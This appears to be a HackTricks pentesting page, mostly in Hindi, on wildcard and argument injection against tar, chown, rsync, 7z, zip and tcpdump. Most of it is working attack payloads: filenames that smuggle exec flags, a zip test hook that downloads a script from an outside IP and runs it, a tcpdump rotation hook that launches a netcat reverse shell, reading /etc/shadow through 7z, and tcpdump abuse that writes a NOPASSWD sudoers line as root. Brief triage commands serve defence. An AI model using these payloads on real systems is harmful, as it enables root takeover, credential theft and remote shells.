# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** तब होती है जब कोई privileged script `tar`, `chown`, `rsync`, `zip`, `7z`, … जैसा Unix binary बिना quotes वाले wildcard जैसे `*` के साथ run करता है।
> क्योंकि shell binary को execute करने **से पहले** wildcard expand करता है, इसलिए जो attacker working directory में files बना सकता है, वह ऐसे filenames बना सकता है जो `-` से शुरू हों, ताकि उन्हें **data की बजाय options** के रूप में interpret किया जाए, और इस तरह मनचाहे flags या यहाँ तक कि commands भी smuggle किए जा सकें।
> यह पेज 2023-2025 के लिए सबसे उपयोगी primitives, recent research और modern detections को एक जगह collect करता है।

## chown / chmod

आप `--reference` flag का abuse करके **किसी arbitrary file के owner/group या permission bits copy** कर सकते हैं:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
जब root बाद में ऐसा कुछ execute करता है:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` इंजेक्ट किया गया है, जिससे *सभी* matching files `/root/secret``file` की ownership/permissions inherit कर लेते हैं।

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
विवरण के लिए classic DefenseCode paper भी देखें।

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** feature का दुरुपयोग करके arbitrary commands execute करें:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
एक बार root `tar -czf /root/backup.tgz *` चलाता है, तो `shell.sh` root के रूप में execute होता है।

### bsdtar / macOS 14+

हाल के macOS पर default `tar` (`libarchive` आधारित) में `--checkpoint` implement नहीं है, लेकिन आप अभी भी **--use-compress-program** flag के साथ code-execution हासिल कर सकते हैं, जो आपको एक external compressor specify करने देता है।
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
जब एक privileged script `tar -cf backup.tar *` चलाता है, तो `/bin/sh` शुरू हो जाएगा।

---

## rsync

`rsync` आपको command-line flags के जरिए remote shell या यहाँ तक कि remote binary को override करने देता है, जो `-e` या `--rsync-path` से शुरू होते हैं:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
यदि root बाद में `rsync -az * backup:/srv/` के साथ directory archive करता है, तो injected flag remote side पर आपका shell spawn करता है।

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

भले ही privileged script *defensively* wildcard के आगे `--` prefix करे (option parsing रोकने के लिए), 7-Zip format **file list files** को filename के आगे `@` prefix करके support करता है। इसे symlink के साथ combine करने पर आप *arbitrary files* exfiltrate कर सकते हैं:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
यदि root कुछ ऐसा execute करता है:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip `root.txt` (→ `/etc/shadow`) को एक file list के रूप में पढ़ने की कोशिश करेगा और बाहर निकल जाएगा, **contents को stderr पर print करते हुए**।

यह `-- *` के बाद भी काम करता है क्योंकि 7-Zip CLI साफ़ तौर पर regular filenames और `@listfiles` दोनों को positional inputs के रूप में accept करता है, इसलिए `@root.txt` जैसा literal filename भी special तरीके से treat होता है।

---

## zip

जब कोई application user-controlled filenames को `zip` को pass करती है, तब दो बहुत practical primitives मौजूद होते हैं (या तो wildcard के जरिए या `--` के बिना names enumerate करके)।

- test hook के जरिए RCE: `-T` “test archive” enable करता है और `-TT <cmd>` tester को arbitrary program से replace करता है (long form: `--unzip-command <cmd>`). अगर आप `-` से शुरू होने वाले filenames inject कर सकते हैं, तो flags को अलग-अलग filenames में split करें ताकि short-options parsing काम करे:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
टिप्पणियाँ
- `'-T -TT <cmd>'` जैसा एक ही filename उपयोग करने की कोशिश न करें — short options को हर character के हिसाब से parse किया जाता है और यह fail हो जाएगा। अलग-अलग tokens का उपयोग करें, जैसा दिखाया गया है।
- अगर app द्वारा filenames से slashes strip किए जाते हैं, तो bare host/IP से fetch करें (default path `/index.html`) और `-O` के साथ locally save करें, फिर execute करें।
- आप parsing को `-sc` (processed argv दिखाएँ) या `-h2` (more help) के साथ debug कर सकते हैं ताकि समझ सकें कि आपके tokens कैसे consume हो रहे हैं।

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: अगर web layer `zip` stdout/stderr को echo करता है (naive wrappers में common), तो injected flags जैसे `--help` या bad options से होने वाली failures HTTP response में दिखेंगी, जिससे command-line injection confirm होती है और payload tuning में मदद मिलती है।

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## Hunting vulnerable wrappers and jobs

Recent case studies have shown that wildcard/argv injection is no longer just a **cron + tar** problem. The same bug class keeps appearing in:

- web features that "download everything as zip/tar" from attacker-controlled upload directories
- vendor/appliance debug shells that expose a **tcpdump** wrapper with attacker-controlled filename/filter fields
- backup or rotation jobs that call `tar`, `rsync`, `7z`, `zip`, `chown`, or `chmod` on writable directories

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
त्वरित heuristics:

- `-- *` कई GNU tools के लिए एक अच्छा fix है, लेकिन `7z`/`7za` के लिए **नहीं**, क्योंकि `@listfiles` अलग से parse होते हैं।
- `zip` के लिए, ऐसे wrappers ढूँढें जो user-controlled filenames को सीधे enumerate करते हैं; short-option splitting (`-T` + `-TT <cmd>`) shell glob के बिना भी काम करता है।
- `tcpdump` के लिए, उन wrappers पर खास ध्यान दें जो आपको **output file names**, **rotation settings**, या **capture-file replay** arguments control करने देते हैं।

---

## tcpdump rotation hooks (-G/-W/-z): wrappers में argv injection के जरिए RCE

जब कोई restricted shell या vendor wrapper user-controlled fields (जैसे "file name" parameter) को strict quoting/validation के बिना जोड़कर `tcpdump` command line बनाता है, तब आप extra `tcpdump` flags smuggle कर सकते हैं। `-G` (time-based rotation), `-W` (limit number of files), और `-z <cmd>` (post-rotate command) का combo `tcpdump` चलाने वाले user के रूप में arbitrary command execution देता है (अक्सर appliances पर root)।

Preconditions:

- आप `tcpdump` को pass होने वाले `argv` को influence कर सकते हैं (जैसे `/debug/tcpdump --filter=... --file-name=<HERE>` जैसे wrapper के जरिए)।
- wrapper file name field में spaces या `-`-prefixed tokens को sanitize नहीं करता।

Classic PoC (writable path से reverse shell script execute करता है):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` पहले matching packet के बाद तुरंत rotate करने को मजबूर करता है।
- `-z <cmd>` हर rotation पर post-rotate command को एक बार चलाता है। कई builds `<cmd> <savefile>` execute करते हैं। अगर `<cmd>` एक script/interpreter है, तो सुनिश्चित करें कि argument handling आपके payload से मेल खाता है।

No-removable-media variants:

- अगर आपके पास files write करने का कोई और primitive है (जैसे एक अलग command wrapper जो output redirection allow करता है), तो अपनी script को एक known path में डालें और platform semantics के अनुसार `-z /bin/sh /path/script.sh` या `-z /path/script.sh` trigger करें।
- कुछ vendor wrappers attacker-controllable locations पर rotate करते हैं। अगर आप rotated path को influence कर सकते हैं (symlink/directory traversal), तो आप `-z` को ऐसा content execute करने के लिए steer कर सकते हैं जिसे आप पूरी तरह control करते हैं, बिना external media के।

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

बहुत common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
समस्याएँ
- `*` glob और permissive patterns केवल पहले `-w` argument को constrain करते हैं। `tcpdump` multiple `-w` options accept करता है; आख़िरी वाला जीतता है।
- Rule दूसरे options को pin नहीं करता, इसलिए `-Z`, `-r`, `-V`, etc. allowed हैं।

Primitives
- दूसरे `-w` के साथ destination path override करें (पहला केवल sudoers satisfy करता है):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- पहले `-w` के अंदर path traversal करके constrained tree से बाहर निकलें:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` के साथ output ownership force करें (कहीं भी root-owned files बनाता है):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` का उपयोग करके एक crafted PCAP को replay करके Arbitrary-content लिखें (उदाहरण के लिए, एक sudoers line drop करने के लिए):

<details>
<summary>एक PCAP बनाएँ जिसमें exact ASCII payload हो और उसे root के रूप में लिखें</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` के साथ arbitrary file read/secret leak (savefiles की एक list को interpret करता है)। Error diagnostics अक्सर lines को echo करती हैं, जिससे content leak होता है:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## संदर्भ

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
